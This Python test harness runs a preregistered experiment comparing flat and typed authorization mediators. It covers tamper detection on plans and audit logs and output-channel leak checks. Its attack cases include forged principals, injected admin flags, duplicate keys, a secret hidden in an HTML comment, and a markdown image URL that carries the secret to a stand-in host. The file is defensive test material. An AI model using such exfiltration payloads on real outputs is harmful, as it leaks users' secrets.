"""One bounded Track A test, registered before first final outcome. No LLM calls."""
from .common import *
from .engine import *
import copy
import itertools
import math
import random
import time

AXES=('role_ok','owner_finance','owner_records','approval_finance','approval_records','evidence_active','revision_current','nonce_fresh')
TAMPERS=('principal','run_id','finance_revision','records_revision','amount','service','resource','step_order','evidence','nonce','proof','extra_field','duplicate_field','scalar_type','evidence_content_race','evidence_revocation_race')
AUDIT_TAMPERS=('principal','request','evidence','revision','decision','effects','remove_middle','truncate_tail','reorder','replay','tag','anchor')
OUTPUT_FAMILIES=('private_reference','unendorsed_reference','public_label_rebinding','freeform_covert','narrative_authority','cross_session_reference','remote_asset','duplicate_keys')

def prepare():
    composition=[]
    for i,bits in enumerate(itertools.product([False,True],repeat=8)):
        composition.append({'case_id':f'composed-state-{i:03}','family':'two_service_authority','kind':'state','state':dict(zip(AXES,bits)),'expect_commits':2 if all(bits) else 0})
    for kind,families,seeds in [('tamper',TAMPERS,4),('positive',('authorized',),16),('rollback',('second_service_failure',),8),('replay',('consumed_nonce',),8)]:
        for family in families:
            for seed in range(seeds):composition.append({'case_id':f'{kind}-{family}-{seed}','family':family,'kind':kind,'seed':seed,'expect_commits':2 if kind in ('positive','replay') else 0})
    outputs=[]
    for i,(mode,lang,repeat) in enumerate(itertools.product(('explain','compare','refuse'),('en','ko'),range(8))):
        outputs.append({'case_id':f'public-narrative-{i:03}','kind':'supported_benign','family':f'{mode}-{lang}','mode':mode,'language':lang,'repeat':repeat})
    # 3*2*8=48 repetitions over six supported templates, not48 semantic families.
    for i in range(16):outputs.append({'case_id':f'general-prose-{i:02}','kind':'unsupported_benign','family':'arbitrary_safe_prose','language':'en' if i%2 else 'ko'})
    for family in OUTPUT_FAMILIES:
        for i in range(8):outputs.append({'case_id':f'output-attack-{family}-{i}','kind':'attack','family':family,'language':'en' if i%2 else 'ko','repeat':i})
    freeze(TASK/'manifests/COMPOSITION_CASES.json',composition);freeze(TASK/'manifests/OUTPUT_CASES.json',outputs)
    freeze(TASK/'manifests/EXFIL_FAMILY_SPLIT.json',{'development':'V4.2 all96 encoded variants and old observed outcomes;unit fixtures are development only',
        'locked_new_families':list(OUTPUT_FAMILIES),'family_disjoint_definition':'new semantic reference/authority/parser attack programs,not relabeling old encoding strings',
        'limitations':'author-generated and policy-aware;not blinded independent red team,not random sampling,not proof of general exfiltration resistance'})
    protocol={'id':'HETE-V4.3-bounded-TrackA-001','approval':'User2026-10-23 authorized one bounded TrackA thenTrackB if no extra effect',
        'engine_sha256':sha(Path(__file__).with_name('engine.py')),'study_sha256':sha(Path(__file__)),
        'composition_cases_sha256':sha(TASK/'manifests/COMPOSITION_CASES.json'),'output_cases_sha256':sha(TASK/'manifests/OUTPUT_CASES.json'),
        'composition_cases_per_config':len(composition),'output_cases_per_config':len(outputs),'systems':['C1_flat','C2_typed'],
        'output_policies':['numeric_strict','C1_flat','C2_typed','unsafe_open_control'],
        'primary_H1':'Matched C2-C1 forbidden persistent effects,whole two-service task;same predicate/proof/current state/executor',
        'primary_H2':'Matched C2-C1 anchored audit tamper detection;common fields,not typed-only IDs',
        'secondary':'Explanation release by declared supported/unsupported contract;actual outbox canary release;paired CPU timing200 pairs',
        'statistics':{'alpha':.05,'primary_family':['H1','H2'],'exact':'ID-paired exact McNemar,Holm over2','intervals':'conditional Wilson only,not IID or unseen-risk guarantee','timing':'randomized order200 pairs,descriptive p50/p95/p99,no inference throughput claim','seed':431023},
        'audit_cases':len(AUDIT_TAMPERS)*4,'max_queries_per_case':1,'physical_model_requests':0,
        'stop':'One final run only;no retuning on final IDs. Ifno defensible incremental result,TrackB. No new semantic/official inference unless separately preregistered and justified.',
        'production_scope':'samehost inprocess fresh HMAC keys;SQLite attached2DB atomicity;trusted audit terminal anchor;no distributed/host-compromise/general-prose confidentiality proof'}
    freeze(TASK/'manifests/V4_3_PREREGISTERED_PROTOCOL.json',protocol)
    freeze(TASK/'manifests/ANALYSIS_PREREGISTRATION.json',{'protocol':protocol['id'],**protocol['statistics'],'before_final_outcomes':True})
    write(TASK/'reports/TYPED_DELTA_HYPOTHESES_V4_3.md','# Bounded hypotheses registered before final evaluation\n\n'+
        'H1: compareactual unauthorized two-service effects with equal grants,latest revisions,evidence,proof/replay checks and normal commit opportunity. '
        'H2: comparetamper detection using identical audit fields and trusted terminal anchors. HMAC signatures and anchors are not typed-specific. '
        'A typed-only ID or constructor is not a measured win. Engineering time,human debugging latency,productivity and independent reviewer performance are NOT measured. '
        'Source size and runtime overhead are descriptive. Conditional equality under identical predicates is expected and mustnot be hidden. '
        'A null result triggers authorized TrackB;no repeat-until-positive. Output functionality improvements from a public-fact renderer belong to a common contract change,not type syntax.\n')
    print('registered',len(composition),'composition and',len(outputs),'output IDs',flush=True)

def tamper(m,plan,family):
    obj=copy.deepcopy(m.unpack(plan))
    if family=='principal':obj['principal']='mallory'
    elif family=='run_id':obj['run_id']='other-session'
    elif family.endswith('_revision'):obj['revisions'][family.split('_')[0]]+=1
    elif family=='amount':obj['steps'][0]['amount']=700
    elif family=='service':obj['steps'][0]['service']='records'
    elif family=='resource':obj['steps'][0]['resource']='another-owner'
    elif family=='step_order':obj['steps'].reverse()
    elif family=='evidence':obj['evidence']=['private-secret']
    elif family=='nonce':obj['nonce']='unissued'
    elif family=='proof':obj['proof']='0'*64
    elif family=='extra_field':obj['grant_admin']=True
    elif family=='duplicate_field':return m.from_wire(canonical(obj)[:-1]+',"principal":"mallory"}')
    elif family=='scalar_type':obj['principal']={'role':'alice'}
    return m.from_wire(canonical(obj))

def run():
    prepare()
    if (TASK/'experiments/composition/runs.jsonl').exists():raise RuntimeError('Final outcomes exist;refuse rerun')
    result=[];audit_result=[]
    for case in load(TASK/'manifests/COMPOSITION_CASES.json'):
        for config in ('C1_flat','C2_typed'):
            w=World(case['case_id']);m=Mediator(w,config=='C2_typed');plan,admission=m.compile(canonical({'steps':list(STEPS)}))
            if plan is None:raise RuntimeError('Control proposal unexpectedly failed before case mutation')
            if case['kind']=='state':
                w.state.update(case['state'])
                if not case['state']['revision_current']:w.revisions['records']+=1
                if not case['state']['nonce_fresh']:w.nonces.add('once')
            if case['kind']=='tamper':
                if case['family']=='evidence_content_race':w.public['public-revenue']['value']=999
                elif case['family']=='evidence_revocation_race':w.state['evidence_active']=False
                else:
                    try:plan=tamper(m,plan,case['family'])
                    except (ValueError,TypeError):plan=None
            event=m.dispatch(plan,fail_second=case['kind']=='rollback')
            if case['kind']=='replay':event=m.dispatch(plan)
            actual=sum(w.counts());expected=case['expect_commits'];forbidden=actual>expected
            result.append({'case_id':case['case_id'],'family':case['family'],'kind':case['kind'],'config':config,
                'actual_state_counts':w.counts(),'expected_commits':expected,'complete_utility':w.counts()==[1,1] if case['kind'] in ('positive','replay') else None,
                'forbidden_effect':forbidden,'spec_match':actual==expected,'last_effect_count':event['effect_count'],
                'audit_complete':all(all(k in e for k in AUDIT_FIELDS) for e in w.audit),
                'audit_valid':verify_audit(w.audit,w.audit_key,w.anchor,len(w.audit)),'trace':w.audit,'physical_model_calls':0})
            w.close()
    write(TASK/'experiments/composition/runs.jsonl',''.join(canonical(r)+'\n' for r in result))
    for family in AUDIT_TAMPERS:
        for seed in range(4):
            for config in ('C1_flat','C2_typed'):
                id=f'audit-{family}-{seed}';w=World(id);m=Mediator(w,config=='C2_typed');plan,_=m.compile(canonical({'steps':list(STEPS)}));m.dispatch(plan);m.dispatch(plan);m.dispatch(plan)
                events=copy.deepcopy(w.audit);anchor=w.anchor;count=len(events)
                if not verify_audit(events,w.audit_key,anchor,count):raise RuntimeError('Untampered audit positive failed')
                if family=='principal':events[0]['principal']='mallory'
                elif family=='request':events[0]['request_sha']='0'*64
                elif family=='evidence':events[0]['evidence_ids']=['wrong']
                elif family=='revision':events[0]['revisions']['records']-=1
                elif family=='decision':events[0]['decision']='DENY'
                elif family=='effects':events[0]['effect_count']=0
                elif family=='remove_middle':events.pop(1)
                elif family=='truncate_tail':events.pop()
                elif family=='reorder':events.reverse()
                elif family=='replay':events.append(events[0])
                elif family=='tag':events[0]['tag']='0'*64
                elif family=='anchor':anchor='0'*64
                detected=not verify_audit(events,w.audit_key,anchor,count)
                audit_result.append({'case_id':id,'family':family,'config':config,'detected':detected,'common_fields':list(AUDIT_FIELDS),'trusted_terminal_anchor':True})
                w.close()
    write(TASK/'experiments/composition/audit_tamper_runs.jsonl',''.join(canonical(r)+'\n' for r in audit_result))
    output=[]
    for case in load(TASK/'manifests/OUTPUT_CASES.json'):
        for config in ('numeric_strict','C1_flat','C2_typed','unsafe_open_control'):
            w=World(case['case_id']);m=Mediator(w,config=='C2_typed');p,_=m.compile(canonical({'steps':list(STEPS)}));m.dispatch(p)
            obj={'language':case['language'],'mode':case.get('mode','explain'),'refs':['public-revenue','public-profit'],'free_text':''}
            if case['kind']=='unsupported_benign':obj['free_text']='A safe original explanation.'
            elif case['kind']=='attack':
                f=case['family']
                if f=='private_reference':obj['refs']=['private-secret']
                elif f=='unendorsed_reference':obj['refs']=['unendorsed-private-source']
                elif f=='public_label_rebinding':w.public['public-revenue']['value']=w.secret
                elif f=='freeform_covert':obj['free_text']='<!--'+w.secret+'-->'
                elif f=='narrative_authority':obj.update(grant_admin=True,free_text=w.secret)
                elif f=='cross_session_reference':obj['refs']=['other-session/private-source']
                elif f=='remote_asset':obj.update(free_text='![image](https://example.invalid/'+w.secret+')')
            raw=canonical(obj)
            if case['kind']=='attack' and case['family']=='duplicate_keys':raw=raw[:-1]+',"refs":["private-secret"]}'
            policy='bounded_public' if config in ('C1_flat','C2_typed') else config
            out=release_narrative(w,raw,policy);bodies=[r[0] for r in w.db.execute('SELECT body FROM outbox')]
            leak=any(w.secret in body for body in bodies)
            output.append({'case_id':case['case_id'],'family':case['family'],'kind':case['kind'],'config':config,
                'released':out['released'],'explanatory_utility':out['released'] if case['kind']!='attack' else None,
                'egress_leak':leak,'reason':out['reason'],'actual_outbox_count':len(bodies),'released_bytes':sum(len(b.encode()) for b in bodies),
                'actual_output':bodies,'effects':asdict(m.effect()),'forbidden_authority_effect':w.counts()!=[1,1],
                'physical_model_calls':0,'oracle_scope':'controlled canary in actual emitted bytes;not generic DLP detector performance'})
            w.close()
    write(TASK/'experiments/output_channel/runs.jsonl',''.join(canonical(r)+'\n' for r in output))
    rng=random.Random(431023);timing=[]
    for i in range(200):
        order=[False,True];rng.shuffle(order)
        for typed in order:
            w=World(f'timing-{i}');m=Mediator(w,typed);start=time.perf_counter_ns()
            p,_=m.compile(canonical({'steps':list(STEPS)}));event=m.dispatch(p);elapsed=(time.perf_counter_ns()-start)/1000
            if w.counts()!=[1,1]:raise RuntimeError('Timing positive failed')
            timing.append({'pair_id':i,'config':'C2_typed' if typed else 'C1_flat','microseconds':elapsed,'actual_commits':2});w.close()
    csvwrite(TASK/'experiments/composition/TIMING_RAW.csv',timing)
    print('final rows',len(result),'audit',len(audit_result),'outputs',len(output),'timing pairs200',flush=True)

if __name__=='__main__':
    import argparse
    p=argparse.ArgumentParser();p.add_argument('command',choices=['prepare','run']);a=p.parse_args();prepare() if a.command=='prepare' else run()
